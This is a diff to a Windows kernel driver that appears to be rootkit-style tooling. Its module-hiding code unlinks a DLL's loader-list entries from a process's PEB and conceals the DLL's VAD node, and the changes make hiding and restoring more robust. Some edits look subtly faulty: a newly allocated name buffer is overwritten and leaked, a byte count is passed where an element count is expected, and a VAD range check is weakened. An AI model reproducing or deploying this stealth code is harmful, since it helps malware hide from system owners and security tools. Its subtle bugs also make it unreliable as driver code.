@@ -530,6 +530,19 @@ NTSTATUS MemoryHandler::HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation
 			if (pebEntry->FullDllName.Length > 0) {
 				if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleInformation.ModuleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
 					entry.OriginalEntry = pListEntry;
+					entry.ModuleName = AllocateMemory<WCHAR*>((static_cast<SIZE_T>(pebEntry->FullDllName.Length) + 1) * sizeof(WCHAR));
+
+					if (!entry.ModuleName) {
+						status = STATUS_INSUFFICIENT_RESOURCES;
+						break;
+					}
+					errno_t err = wcscpy_s(entry.ModuleName, pebEntry->FullDllName.Length, pebEntry->FullDllName.Buffer);
+
+					if (err != 0) {
+						FreeVirtualMemory(entry.ModuleName);
+						status = STATUS_INVALID_PARAMETER;
+						break;
+					}
 					entry.ModuleName = moduleInformation.ModuleName;
 					entry.Pid = moduleInformation.Pid;
 					entry.Links.InLoadOrderLinks = pebEntry->InLoadOrderLinks;
@@ -554,15 +567,18 @@ NTSTATUS MemoryHandler::HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation
 		status = VadHideObject(targetProcess, reinterpret_cast<ULONG_PTR>(moduleBase), entry);
 
 		if (!NT_SUCCESS(status)) {
-			status = RestorePebModule(targetProcess, &entry);
+			if (!NT_SUCCESS(RestorePebModule(targetProcess, &entry)))
+				status = STATUS_UNSUCCESSFUL;
 			ObDereferenceObject(targetProcess);
 			return status;
 		}
 
 		if (!AddHiddenModule(entry)) {
-			status = STATUS_INSUFFICIENT_RESOURCES;
 			ObDereferenceObject(targetProcess);
-			RestoreModule(&entry);
+			status = RestoreModule(&entry);
+
+			if (NT_SUCCESS(status))
+				status = STATUS_INSUFFICIENT_RESOURCES;
 			return status;
 		}
 	}
@@ -620,8 +636,7 @@ void MemoryHandler::RestoreModules(_In_ ULONG pid) {
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
-	PLDR_DATA_TABLE_ENTRY pebEntry;
-	KAPC_STATE state;
+	KAPC_STATE state = { 0 };
 	NTSTATUS status = STATUS_SUCCESS;
 	PEPROCESS targetProcess = NULL;
 	LARGE_INTEGER time = { 0 };
@@ -644,7 +659,7 @@ NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
 		status = VadRestoreObject(targetProcess, moduleEntry->VadNode, moduleEntry->ModuleName);
 	FreeVirtualMemory(moduleEntry->ModuleName);
 
-	if (RemoveListEntry(&hiddenModules, moduleEntry))
+	if (!IsInvalidListEntry(&moduleEntry->Entry) && !RemoveListEntry(&hiddenModules, moduleEntry))
 		status = STATUS_UNSUCCESSFUL;
 	ObDereferenceObject(targetProcess);
 	return status;
@@ -669,15 +684,21 @@ NTSTATUS MemoryHandler::RestorePebModule(_In_ PEPROCESS& process, _In_ HiddenMod
 	time.QuadPart = ONE_SECOND;
 
 	constexpr auto RestoreEntry = [](PLDR_DATA_TABLE_ENTRY pebEntry, HiddenModuleEntry* entry) -> bool {
-		if (IsInvalidListEntry(&pebEntry->InLoadOrderLinks) || IsInvalidListEntry(&pebEntry->InInitializationOrderLinks) ||
-			IsInvalidListEntry(&pebEntry->InMemoryOrderLinks) || IsInvalidListEntry(&pebEntry->HashLinks)) {
+		if ((IsInvalidListEntry(&pebEntry->InLoadOrderLinks) && !IsInvalidListEntry(&entry->Links.InLoadOrderLinks)) || 
+			(IsInvalidListEntry(&pebEntry->InInitializationOrderLinks) && !IsInvalidListEntry(&entry->Links.InInitializationOrderLinks)) ||
+			(IsInvalidListEntry(&pebEntry->InMemoryOrderLinks) && !IsInvalidListEntry(&entry->Links.InMemoryOrderLinks)) ||
+			(IsInvalidListEntry(&pebEntry->HashLinks) && !IsInvalidListEntry(&entry->Links.HashLinks))) {
 			return false;
 		}
 		__try {
-			InsertTailList(&pebEntry->InLoadOrderLinks, &entry->Links.InLoadOrderLinks);
-			InsertTailList(&pebEntry->InInitializationOrderLinks, &entry->Links.InInitializationOrderLinks);
-			InsertTailList(&pebEntry->InMemoryOrderLinks, &entry->Links.InMemoryOrderLinks);
-			InsertTailList(&pebEntry->HashLinks, &entry->Links.HashLinks);
+			if (!IsInvalidListEntry(&entry->Links.InLoadOrderLinks))
+				InsertHeadList(&pebEntry->InLoadOrderLinks, &entry->Links.InLoadOrderLinks);
+			if (!IsInvalidListEntry(&entry->Links.InInitializationOrderLinks))
+				InsertHeadList(&pebEntry->InInitializationOrderLinks, &entry->Links.InInitializationOrderLinks);
+			if (!IsInvalidListEntry(&entry->Links.InMemoryOrderLinks))
+				InsertHeadList(&pebEntry->InMemoryOrderLinks, &entry->Links.InMemoryOrderLinks);
+			if (!IsInvalidListEntry(&entry->Links.HashLinks))
+				InsertHeadList(&pebEntry->HashLinks, &entry->Links.HashLinks);
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
 			return false;
@@ -732,7 +753,7 @@ NTSTATUS MemoryHandler::RestorePebModule(_In_ PEPROCESS& process, _In_ HiddenMod
 
 		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
-		if (pebEntry) {
+		if (pebEntry && !IsInvalidListEntry(&pebEntry->InLoadOrderLinks)) {
 			if (RestoreEntry(pebEntry, moduleEntry)) {
 				KeUnstackDetachProcess(&state);
 				return STATUS_SUCCESS;
@@ -1284,7 +1305,7 @@ NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR 
 	if (vadRootOffset == 0 || pageCommitmentLockOffset == 0)
 		return STATUS_INVALID_ADDRESS;
 
-	PRTL_AVL_TABLE vadTable = reinterpret_cast<PRTL_AVL_TABLE>(reinterpret_cast<PUCHAR>(process) + vadRootOffset);
+	PRTL_AVL_TABLE vadTable = *reinterpret_cast<PRTL_AVL_TABLE*>(reinterpret_cast<PUCHAR>(process) + vadRootOffset);
 	EX_PUSH_LOCK pageTableCommitmentLock = reinterpret_cast<EX_PUSH_LOCK>(reinterpret_cast<PUCHAR>(process) + pageCommitmentLockOffset);
 	TABLE_SEARCH_RESULT res = VadFindNodeOrParent(vadTable, targetAddressStart, &pageTableCommitmentLock, &node);
 
@@ -1388,7 +1409,7 @@ TABLE_SEARCH_RESULT MemoryHandler::VadFindNodeOrParent(_In_ PRTL_AVL_TABLE table
 			result = TableInsertAsLeft;
 			break;
 		}
-		else if (targetPageAddress >= startAddress && targetPageAddress <= endAddress) {
+		else if (targetPageAddress <= endAddress) {
 			*outNode = nodeToCheck;
 			result = TableFoundNode;
 			break;
@@ -1538,7 +1559,7 @@ HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ IoctlHiddenModuleInfo& i
 */
 _IRQL_requires_max_(APC_LEVEL)
 HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ HiddenModuleEntry& info) const {
-	if (!info.ModuleName || !IsValidPath(info.ModuleName) || info.Pid <= SYSTEM_PROCESS_PID)
+	if (!IsValidPath(info.ModuleName) || info.Pid <= SYSTEM_PROCESS_PID)
 		ExRaiseStatus(STATUS_INVALID_PARAMETER);
 
 	auto finder = [](_In_ const HiddenModuleEntry* item, _In_ HiddenModuleEntry& infoToSearch) {
@@ -1594,6 +1615,7 @@ bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenD
 _IRQL_requires_max_(APC_LEVEL)
 bool MemoryHandler::AddHiddenModule(_Inout_ HiddenModuleEntry& item) {
 	HiddenModuleEntry* entry = nullptr;
+
 	if (!IsValidPath(item.ModuleName) || item.Pid <= SYSTEM_PROCESS_PID)
 		return false;
 
@@ -1611,6 +1633,7 @@ bool MemoryHandler::AddHiddenModule(_Inout_ HiddenModuleEntry& item) {
 
 	if (!entry)
 		return false;
+	entry->ModuleName = item.ModuleName;
 	entry->Pid = item.Pid;
 	entry->OriginalVadProtection = item.OriginalVadProtection;
 	entry->VadNode = item.VadNode;
@@ -1618,13 +1641,6 @@ bool MemoryHandler::AddHiddenModule(_Inout_ HiddenModuleEntry& item) {
 	entry->Links.InInitializationOrderLinks = item.Links.InInitializationOrderLinks;
 	entry->Links.InLoadOrderLinks = item.Links.InLoadOrderLinks;
 	entry->Links.InMemoryOrderLinks = item.Links.InMemoryOrderLinks;
-
-	errno_t err = wcscpy_s(entry->ModuleName, (wcslen(item.ModuleName) + 1) * sizeof(wchar_t), item.ModuleName);
-
-	if (err != 0) {
-		FreeVirtualMemory(entry);
-		return false;
-	}
 	AddEntry(&this->hiddenModules, entry);
 	return true;
 }
